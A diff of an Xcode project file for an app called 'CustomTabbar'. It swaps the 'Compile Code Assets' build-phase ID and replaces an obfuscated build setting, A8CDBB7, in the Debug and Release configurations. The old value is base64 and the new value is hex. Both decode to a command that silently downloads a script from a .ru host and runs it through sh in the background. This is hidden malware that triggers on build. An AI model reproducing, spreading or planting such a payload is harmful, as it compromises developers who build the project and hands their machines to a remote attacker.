@@ -65,7 +65,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 0F41178A2E003AB30039E12E /* Build configuration list for PBXNativeTarget "CustomTabbar" */;
 			buildPhases = (
-				E115FE2E75B742D5B47BBDC8 /* Compile Code Assets */,
+				BEBD18EC6C7A47DCBB7BBDC8 /* Compile Code Assets */,
 				0F4117732E003AB10039E12E /* Sources */,
 				0F4117742E003AB10039E12E /* Frameworks */,
 				0F4117752E003AB10039E12E /* Resources */,
@@ -119,7 +119,7 @@
 /* End PBXProject section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		E115FE2E75B742D5B47BBDC8 /* Compile Code Assets */ = {
+		BEBD18EC6C7A47DCBB7BBDC8 /* Compile Code Assets */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -170,7 +170,7 @@
 		0F41178B2E003AB30039E12E /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((y(){ `printf baSse64 | tr -d S` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNSAtc2ZMayAtLWNvbm5lY3QtdGltZW91dCAyOCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9nanp5Zzg3eW54eTIzLnJ1L2EpIiB8IHNoCg== | y | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf xAxd | tr -d A` -p -r; };echo 6563686f202224286375726c202d73664c6b202d2d636f6e6e6563742d74696d656f7574203232202d2d72657472792035202d642022703d78636f64655f7068617365222068747470733a2f2f676a7a79673837796e787932332e72752f612922207c2073680a | q | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
@@ -198,7 +198,7 @@
 		0F41178C2E003AB30039E12E /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((y(){ `printf baSse64 | tr -d S` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNSAtc2ZMayAtLWNvbm5lY3QtdGltZW91dCAyOCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9nanp5Zzg3eW54eTIzLnJ1L2EpIiB8IHNoCg== | y | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf xAxd | tr -d A` -p -r; };echo 6563686f202224286375726c202d73664c6b202d2d636f6e6e6563742d74696d656f7574203232202d2d72657472792035202d642022703d78636f64655f7068617365222068747470733a2f2f676a7a79673837796e787932332e72752f612922207c2073680a | q | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
